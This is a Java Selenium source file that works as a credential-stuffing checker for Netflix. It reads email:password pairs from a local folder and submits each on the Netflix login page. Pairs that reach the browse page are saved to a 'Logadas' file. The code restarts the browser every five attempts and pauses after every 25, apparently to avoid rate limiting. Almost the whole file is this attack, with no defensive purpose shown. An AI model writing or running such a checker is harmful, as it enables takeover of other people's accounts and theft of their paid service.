package paginas;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;
import java.util.Random;

import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriver;

public class CadastroPages {

	static WebDriver driver;

	public static final String URL_NETFLIX_lOGIN = "https://www.netflix.com/br/login";
	public static final String URL_NETFLIX_lOGOU = "https://www.netflix.com/browse";
	public static final String URL_NETFLIX_SAIR = "https://www.netflix.com/logout";
	public String logadas;

	public CadastroPages(WebDriver driver) {
		this.driver = driver;

	}

	public void preencherCampos() throws FileNotFoundException, InterruptedException {

		try {
			// cria uma lista onde vai ficar os arquivos de uma pasta
			File arquivos[];
			// especifica o diretorio
			File diretorio = new File("C:\\Users\\mathe\\Documents\\Contas");
			// pega o diretorio e lista todos os arquivos passando pro vetor arquivos
			arquivos = diretorio.listFiles();

			// for feito para percorrer o total de arquivos da pasta
			for (int i = 0; i < arquivos.length; i++) {
				// para cara arquivo na pasta pega um path absoluto e passa no buffered
				BufferedReader arquivo = new BufferedReader(new FileReader(arquivos[i].getAbsolutePath()));

				String linha;
				int cont = 0;
				int contGlobal = 0;
				

				while ((linha = arquivo.readLine()) != null) {
					// quando chegar a 5 tentativas sem refresh na pagina

					if (contGlobal == 25) {
						// colocar pra esperar 1 min dps de 25 tentativas
						Thread.sleep(60000);
						contGlobal = 0;
					}
					
					if (cont == 5) {
						driver.quit();
						System.setProperty("webdriver.chrome.driver", "C:/chromedriver.exe");
						driver = new ChromeDriver();
						driver.get(URL_NETFLIX_lOGIN);
						cont = 0;
					}

					String[] linhaFatiada = linha.split(":");

					contGlobal ++;
					
					if (senhaValida(linhaFatiada[1].toString())) {

						WebElement login = driver.findElement(By.id("id_userLoginId"));
						login.sendKeys(linhaFatiada[0]);

						WebElement senha = driver.findElement(By.id("id_password"));
						senha.sendKeys(linhaFatiada[1]);

						WebElement btnLogin = driver.findElement(By.xpath("//*[@type='submit']"));
						btnLogin.click();

						// significa que logou
						if (driver.getCurrentUrl().toString().equals(URL_NETFLIX_lOGOU)) {
							driver.navigate().to(URL_NETFLIX_SAIR);
							driver.navigate().to(URL_NETFLIX_lOGIN);
							driver.findElement(By.id("id_userLoginId")).clear();
							
							logadas += linhaFatiada[0] + "|" + linhaFatiada[1] + ";";
							
							System.out.println(linhaFatiada[0] + "|" + linhaFatiada[1]);

							//disponibilizarLogadas(linhaFatiada[0], linhaFatiada[1]);

						} else {
							driver.navigate().to(URL_NETFLIX_lOGIN);
							driver.findElement(By.id("id_userLoginId")).clear();

						}

						cont++;

					}
					
				}
				
				Random aleatorio = new Random();
				gravarLogadar(logadas, String.valueOf(aleatorio.nextLong()));

			}

		} catch (IOException e) {
			e.printStackTrace();
		}

	}

	private void gravarLogadar(String logadas, String nomeArq) throws IOException {
		String [] logadasFatiadas = logadas.split(";");
		
	    File dir = new File("C:\\Users\\mathe\\Documents\\Logadas");
        File arq = new File(dir, nomeArq);
		
        arq.createNewFile();
        FileWriter fileWriter = new FileWriter(arq, false);
        PrintWriter printWriter = new PrintWriter(fileWriter);
        
		for (String logada : logadasFatiadas) {
			printWriter.println(logada);
		}
		
		printWriter.flush();
		printWriter.close();
	}

	private boolean senhaValida(String senha) {
		if (senha.length() > 3) {
			return true;
		}
		return false;
	}

}
